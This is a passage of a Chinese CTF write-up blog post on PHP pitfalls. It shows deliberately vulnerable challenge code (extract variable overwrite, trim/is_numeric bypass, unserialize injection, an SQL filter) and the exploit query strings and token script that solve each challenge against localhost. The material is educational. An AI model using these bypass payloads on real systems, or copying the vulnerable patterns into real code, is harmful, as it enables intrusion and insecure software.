<!DOCTYPE html><html><head><meta name="google-site-verification" content="1ia5dGzRACgefl6X6Bop8RyCADGr5_2t_cPSC6VuVos"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="robots" content="index,follow"><meta name="description" content="01 extract变量覆盖code12345678910111213141516&amp;lt;?php$flag=&apos;xxx&apos;; extract($_GET); if(isset($shiyan)) &amp;#123;     $content=trim(file_get_contents($flag));    if($shiyan==$content)    &amp;#123;         echo&apos;ctf"><meta name="keywords" content="PHP CTF tricks"><meta property="og:type" content="article"><meta property="og:title" content="CTF中常见PHP特性学习笔记"><meta property="og:url" content="https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/index.html"><meta property="og:site_name" content="Hackfun"><meta property="og:description" content="01 extract变量覆盖code12345678910111213141516&amp;lt;?php$flag=&apos;xxx&apos;; extract($_GET); if(isset($shiyan)) &amp;#123;     $content=trim(file_get_contents($flag));    if($shiyan==$content)    &amp;#123;         echo&apos;ctf"><meta property="og:image" content="https://i.imgur.com/RiZzqMb.png"><meta property="og:image" content="https://i.imgur.com/ut0KE1j.jpg"><meta property="og:image" content="https://i.imgur.com/y0n8H3y.jpg"><meta property="og:image" content="https://i.imgur.com/CsR6w8b.png"><meta property="og:image" content="https://i.imgur.com/0qPBqKN.png"><meta property="og:image" content="https://i.imgur.com/tKgyoKw.png"><meta property="og:image" content="https://i.imgur.com/AeH6Oc8.png"><meta property="og:image" content="https://i.imgur.com/fR3MV3c.png"><meta property="og:image" content="https://i.imgur.com/qWSB9h9.png"><meta property="og:image" content="https://i.imgur.com/Qs1Nv5D.png"><meta property="og:image" content="https://i.imgur.com/wZObzv9.png"><meta property="og:image" content="https://i.imgur.com/oVWI3yX.png"><meta property="og:updated_time" content="2018-01-09T11:07:07.000Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="CTF中常见PHP特性学习笔记"><meta name="twitter:description" content="01 extract变量覆盖code12345678910111213141516&amp;lt;?php$flag=&apos;xxx&apos;; extract($_GET); if(isset($shiyan)) &amp;#123;     $content=trim(file_get_contents($flag));    if($shiyan==$content)    &amp;#123;         echo&apos;ctf"><meta name="twitter:image" content="https://i.imgur.com/RiZzqMb.png"><meta name="twitter:creator" content="@jinglingbiaodi"><link rel="publisher" href="https://plus.google.com/117450799036676139034"><meta property="fb:admins" content="jinglingbiaodi"><meta property="fb:app_id" content="jinglingbiaodi"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>CTF中常见PHP特性学习笔记</title><link rel="stylesheet" href="/css/style.css"><link rel="alternate" href="/atom.xml" title="Hackfun - | Secblog | Pentest | Auditing | Sectool | CTF Write-up" type="application/atom+xml"></head><body><div id="header-post"><a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Link</a></li><li><a href="/tags/kali-linux">Kali</a></li><li><a href="/archives/">Archives</a></li><li><a href="http://github.com/sunnyelf">Projects</a></li><li><a href="/search/">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="/2018/04/26/Cheetah-GUI/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/2017/10/04/给hexo添加本地搜索站内功能/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&text=CTF中常见PHP特性学习笔记"><i class="fa fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&is_video=false&description=CTF中常见PHP特性学习笔记"><i class="fa fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=CTF中常见PHP特性学习笔记&body=Check out this article: https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/"><i class="fa fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&title=CTF中常见PHP特性学习笔记"><i class="fa fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/&name=CTF中常见PHP特性学习笔记&description="><i class="fa fa-tumblr" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-extract变量覆盖"><span class="toc-number">1.</span> <span class="toc-text">01 extract变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-绕过trim函数过滤"><span class="toc-number">2.</span> <span class="toc-text">02 绕过trim函数过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-多重加密"><span class="toc-number">3.</span> <span class="toc-text">03 多重加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-SQL注入WITH-ROLLUP绕过"><span class="toc-number">4.</span> <span class="toc-text">04 SQL注入WITH ROLLUP绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-ereg正则-00截断"><span class="toc-number">5.</span> <span class="toc-text">05 ereg正则%00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-strcmp比较字符串"><span class="toc-number">6.</span> <span class="toc-text">06 strcmp比较字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-sha-函数比较绕过"><span class="toc-number">7.</span> <span class="toc-text">07 sha()函数比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-SESSION验证绕过"><span class="toc-number">8.</span> <span class="toc-text">08 SESSION验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-密码md5比较绕过"><span class="toc-number">9.</span> <span class="toc-text">09 密码md5比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-urldecode二次编码绕过"><span class="toc-number">10.</span> <span class="toc-text">10 urldecode二次编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-sql闭合绕过"><span class="toc-number">11.</span> <span class="toc-text">11 sql闭合绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-X-Forwarded-For绕过指定IP地址"><span class="toc-number">12.</span> <span class="toc-text">12 X-Forwarded-For绕过指定IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-md5加密相等绕过"><span class="toc-number">13.</span> <span class="toc-text">13 md5加密相等绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-intval函数向下取整"><span class="toc-number">14.</span> <span class="toc-text">14 intval函数向下取整</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-strpos数组绕过NULL与ereg正则-00截断"><span class="toc-number">15.</span> <span class="toc-text">15 strpos数组绕过NULL与ereg正则%00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-SQL注入or绕过"><span class="toc-number">16.</span> <span class="toc-text">16 SQL注入or绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-密码md5比较绕过"><span class="toc-number">17.</span> <span class="toc-text">17 密码md5比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-md5-函数-使用数组绕过"><span class="toc-number">18.</span> <span class="toc-text">18 md5()函数===使用数组绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-ereg-函数strpos-函数用数组返回NULL绕过"><span class="toc-number">19.</span> <span class="toc-text">19 ereg()函数strpos() 函数用数组返回NULL绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-十六进制与数字比较"><span class="toc-number">20.</span> <span class="toc-text">20 十六进制与数字比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-数字验证正则绕过"><span class="toc-number">21.</span> <span class="toc-text">21 数字验证正则绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-弱类型整数大小比较绕过"><span class="toc-number">22.</span> <span class="toc-text">22 弱类型整数大小比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-md5函数验证绕过"><span class="toc-number">23.</span> <span class="toc-text">23 md5函数验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-md5函数true绕过注入"><span class="toc-number">24.</span> <span class="toc-text">24 md5函数true绕过注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-switch没有break-字符与0比较绕过"><span class="toc-number">25.</span> <span class="toc-text">25 switch没有break 字符与0比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-unserialize-序列化"><span class="toc-number">26.</span> <span class="toc-text">26 unserialize()序列化</span></a></li></ol></div></span></div><div class="content index width mx-auto px2 my4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">CTF中常见PHP特性学习笔记</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><i class="fa fa-user-secret"></i><span itemprop="name">Jing Ling</span> </span><i class="fa fa-calendar"></i><div class="postdate"><time datetime="2018-01-09T09:00:00.000Z" itemprop="datePublished">2018-01-09</time></div><i class="fa fa-eye"></i><span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span></span><div class="article-tag"><i class="fa fa-tag"></i> <a class="tag-link" href="/tags/PHP-CTF-tricks/">PHP CTF tricks</a></div></div></header><div class="content" itemprop="articleBody"><h2 id="01-extract变量覆盖"><a href="#01-extract变量覆盖" class="headerlink" title="01 extract变量覆盖"></a>01 extract变量覆盖</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag=<span class="string">'xxx'</span>; </div><div class="line">extract($_GET);</div><div class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</div><div class="line"> &#123; </div><div class="line">    $content=trim(file_get_contents($flag));</div><div class="line">    <span class="keyword">if</span>($shiyan==$content)</div><div class="line">    &#123; </div><div class="line">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>; </div><div class="line">    &#125;</div><div class="line">   <span class="keyword">else</span></div><div class="line">   &#123; </div><div class="line">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</div><div class="line">   &#125; </div><div class="line">   &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p>资料：</p><ul><li><a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="external">PHP extract() 函数</a></li></ul><p><code>http://localhost/php_bugs/extract1.php?shiyan=&amp;flag=1</code></p><p><img src="https://i.imgur.com/RiZzqMb.png" alt="extract变量覆盖"></p><h2 id="02-绕过trim函数过滤"><a href="#02-绕过trim函数过滤" class="headerlink" title="02 绕过trim函数过滤"></a>02 绕过trim函数过滤</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> </div><div class="line">$info = <span class="string">""</span>; </div><div class="line">$req = [];</div><div class="line">$flag=<span class="string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;</div><div class="line"> </div><div class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); <span class="comment">//为一个配置选项设置值</span></div><div class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭所有PHP错误报告</span></div><div class="line"> </div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'number'</span>]))&#123;</div><div class="line">   header(<span class="string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span>); <span class="comment">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span></div><div class="line"> </div><div class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); <span class="comment">//die — 等同于 exit()</span></div><div class="line"> </div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123;  <span class="comment">//foreach 语法结构提供了遍历数组的简单方式 </span></div><div class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123; </div><div class="line">        $value = trim($value);  <span class="comment">//trim — 去除字符串首尾处的空白字符（或者其他字符）</span></div><div class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); <span class="comment">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span></div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123; </div><div class="line">    $number = strval($number); <span class="comment">//strval — 获取变量的字符串值</span></div><div class="line">    $i = <span class="number">0</span>; </div><div class="line">    $j = strlen($number) - <span class="number">1</span>; <span class="comment">//strlen — 获取字符串长度</span></div><div class="line">    <span class="keyword">while</span>($i &lt; $j) &#123; </div><div class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </div><div class="line">        &#125; </div><div class="line">        $i++; </div><div class="line">        $j--; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </div><div class="line">&#125; </div><div class="line"> </div><div class="line"> </div><div class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>])) <span class="comment">//is_numeric — 检测变量是否为数字或数字字符串 </span></div><div class="line">&#123;</div><div class="line"> </div><div class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</div><div class="line"> </div><div class="line">&#125;</div><div class="line"><span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>]))) <span class="comment">//intval — 获取变量的整数值</span></div><div class="line">&#123;</div><div class="line"> </div><div class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </div><div class="line"> </div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"> </div><div class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</div><div class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));  </div><div class="line"> </div><div class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</div><div class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">else</span></div><div class="line">     &#123;</div><div class="line"> </div><div class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</div><div class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>; </div><div class="line">          &#125;</div><div class="line">          <span class="keyword">else</span></div><div class="line">          &#123;</div><div class="line">             $info=$flag;</div><div class="line">          &#125;</div><div class="line">     &#125;</div><div class="line"> </div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="keyword">echo</span> $info;</div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><p>由于<code>is_numeric</code>没有检测<code>\0(%00)</code>，所以导致<code>is_numeric($_REQUEST[&#39;number&#39;])</code>为<code>False</code>，成功跳过检测。</p><p><img src="https://i.imgur.com/ut0KE1j.jpg" alt="is_numeric"></p><p>由于trim函数没有过滤<code>\f(%0c)</code>，而<code>intval</code>函数而跳过<code>\f(%0c)</code>，导致<code>$value1</code>和<code>$value2</code>都为相等，进入到<code>is_palindrome_number</code>函数成功通过<code>$number[$i] !== $number[$j]</code>检测返回<code>false</code>，最终进入到获取<code>$flag</code>最后的<code>else</code>里。</p><p><img src="https://i.imgur.com/y0n8H3y.jpg" alt="trim"></p><p>资料</p><ul><li><a href="http://www.chnpanda.com/961.html" target="_blank" rel="external">PHP类型与逻辑+fuzz与源代码审计</a></li></ul><p><code>http://localhost/php_bugs/02.php?number=%0c1</code></p><h2 id="03-多重加密"><a href="#03-多重加密" class="headerlink" title="03 多重加密"></a>03 多重加密</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">include</span> <span class="string">'common.php'</span>;</div><div class="line">    $requset = array_merge($_GET, $_POST, $_COOKIE);</div><div class="line">    <span class="comment">//把一个或多个数组合并为一个数组</span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">db</span></span></div><div class="line"><span class="class">    </span>&#123;</div><div class="line">        <span class="keyword">public</span> $where;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;where))</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;select(<span class="keyword">$this</span>-&gt;where);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($where)</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            $sql = mysql_query(<span class="string">'select * from user where '</span>.$where);</div><div class="line">            <span class="comment">//函数执行一条 MySQL 查询。</span></div><div class="line">            <span class="keyword">return</span> @mysql_fetch_array($sql);</div><div class="line">            <span class="comment">//从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</div><div class="line">    <span class="comment">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span></div><div class="line">    &#123;</div><div class="line">        $login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</div><div class="line">        <span class="comment">//gzuncompress:进行字符串压缩</span></div><div class="line">        <span class="comment">//unserialize: 将已序列化的字符串还原回 PHP 的值</span></div><div class="line"></div><div class="line">        $db = <span class="keyword">new</span> db();</div><div class="line">        $row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</div><div class="line">        <span class="comment">//mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> $flag;</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// else&#123;</span></div><div class="line">    <span class="comment">//     header('Location: index.php?error=1');</span></div><div class="line">    <span class="comment">// &#125;</span></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$arr = <span class="keyword">array</span>([<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>);</div><div class="line">$token = base64_encode(gzcompress(serialize($arr)));</div><div class="line">print_r($token);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><code>eJxLtDK0qs60MrBOAuJaAB5uBBQ=</code></p><p><code>http://127.0.0.1/php_bugs/03.php?token=eJxLtDK0qs60MrBOAuJaAB5uBBQ=</code></p><h2 id="04-SQL注入WITH-ROLLUP绕过"><a href="#04-SQL注入WITH-ROLLUP绕过" class="headerlink" title="04 SQL注入WITH ROLLUP绕过"></a>04 SQL注入WITH ROLLUP绕过</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line"></div><div class="line"><span class="comment">//检测变量是否是数组</span></div><div class="line"></div><div class="line">        $StrValue=implode($StrValue);</div><div class="line"></div><div class="line"><span class="comment">//返回由数组元素组合成的字符串</span></div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line"></div><div class="line"><span class="comment">//匹配成功一次后就会停止匹配</span></div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line"></div><div class="line"><span class="comment">//遍历数组</span></div><div class="line"></div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"test"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line"></div><div class="line"><span class="comment">//设置活动的 MySQL 数据库</span></div><div class="line"></div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line"><span class="keyword">echo</span> $sql;</div><div class="line"><span 